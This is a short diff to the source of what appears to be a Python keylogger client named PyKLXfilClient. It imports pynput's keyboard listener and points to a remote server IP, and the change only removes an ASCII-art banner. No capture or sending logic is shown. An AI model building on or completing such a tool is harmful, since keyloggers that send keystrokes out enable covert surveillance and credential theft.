@@ -14,20 +14,7 @@ from pynput.keyboard import Listener
 
 
 class PyKLXfilClient:
-
-
-    banner = '''
-    ______      _   __ _     __   __ __ _ _ 
-    | ___ \    | | / /| |    \ \ / // _(_) |
-    | |_/ /   _| |/ / | |     \ V /| |_ _| |
-    |  __/ | | |    \ | |     /   \|  _| | |
-    | |  | |_| | |\  \| |____/ /^\ \ | | | |
-    \_|   \__, \_| \_/\_____/\/   \/_| |_|_|
-           __/ |  id4rksid3               v1.0
-          |___/                             
-
-          '''    
-
+ 
     def __init__(self):
         #The host/IP and port the PyKLXfill server is running on
         ###Edit with your server's IP/Domain and port.###
